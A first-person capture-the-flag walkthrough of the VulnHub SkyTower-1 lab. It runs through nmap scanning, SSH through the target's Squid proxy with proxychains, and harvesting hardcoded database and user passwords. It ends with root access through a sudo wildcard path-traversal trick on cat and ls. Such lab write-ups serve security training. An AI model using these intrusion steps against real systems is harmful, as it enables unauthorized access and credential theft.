# SkyTower-1 CTF Walkthrough

**Laboratory Link:** [VulnHub - SkyTower 1](https://www.vulnhub.com/entry/skytower-1,96/)
**Difficulty:** Intermediate
**Objective:** Gain root access and read the flag.

## 1\. Reconnaissance

I began by scanning the network to identify the target and open ports.

```bash
nmap -sN 192.168.56.0/24
nmap -A -p- 192.168.56.101
```

**Results:**

  * **Port 22 (SSH):** State is `filtered`.
  * **Port 80 (HTTP):** Apache httpd 2.2.22.
  * **Port 3128 (Squid HTTP Proxy):** Squid 3.1.20.

The scan revealed that direct access to SSH (Port 22) was blocked/filtered, but a Squid Proxy was running on port 3128. This suggested that traffic needs to be tunneled through the proxy to reach the SSH service.

## 2\. Gaining Initial Access (John)

### Proxy Configuration

To bypass the firewall restrictions on Port 22, I configured `proxychains` to route traffic through the target's Squid proxy.

I edited `/etc/proxychains4.conf` to include the target proxy:

```conf
http 192.168.56.101 3128
```

### SSH Connection

Using the credentials previously obtained (`john` : `hereisjohn`), I connected via ProxyChains.

```bash
proxychains ssh john@192.168.56.101
```

*Note: Several attempts were made; eventually, the connection was successful, and I gained user access.*

## 3\. Enumeration & Privilege Escalation (Database)

Once inside as user `john`, I explored the file system. I located the web server files in `/var/www/`.

I inspected `login.php` to see how the application connects to the database:

```bash
cd /var/www
cat login.php
```

**Findings:**
The PHP script contained hardcoded database credentials:

  * **DB Host:** localhost
  * **DB User:** `root`
  * **DB Pass:** `root`
  * **DB Name:** `SkyTech`

### Dumping the Database

Using these credentials, I logged into the MySQL database to dump the `login` table.

```bash
mysql -uroot -p
# Password: root
mysql> use SkyTech;
mysql> select * from login;
```

**Extracted Credentials:**
| ID | Email | Password |
| :--- | :--- | :--- |
| 1 | john@skytech.com | hereisjohn |
| 2 | sara@skytech.com | **ihatethisjob** |
| 3 | william@skytech.com | senseable |

## 4\. Lateral Movement (User Sara)

With the new credentials found in the database, I pivoted to the user `sara`.

```bash
proxychains ssh sara@192.168.56.101
# Password: ihatethisjob
```

## 5\. Root Privilege Escalation

After logging in as `sara`, I checked for sudo privileges:

```bash
sudo -l
```

**Output:**

```text
User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
```

Sara had permission to run `ls` and `cat` on files within the `/accounts/` directory as root, without a password. However, this configuration is vulnerable to **Path Traversal**.

### Exploitation

I used `../` (directory traversal) to break out of the `/accounts/` directory and access the `/root` directory.

1.  **Locate the flag:**

    ```bash
    sudo /bin/ls /accounts/../../../../root
    # Result: flag.txt
    ```

2.  **Read the flag:**

    ```bash
    sudo /bin/cat /accounts/../../../root/flag.txt
    ```

**Flag Content:**

> Congratz, have a cold one to celebrate\!
> root password is theskytower

## 6\. Conclusion

Using the password found in the flag, I successfully logged in as the root user.

```bash
proxychains ssh root@192.168.56.101
# Password: theskytower
id
# uid=0(root) gid=0(root) groups=0(root)
```

**Box Pwned.**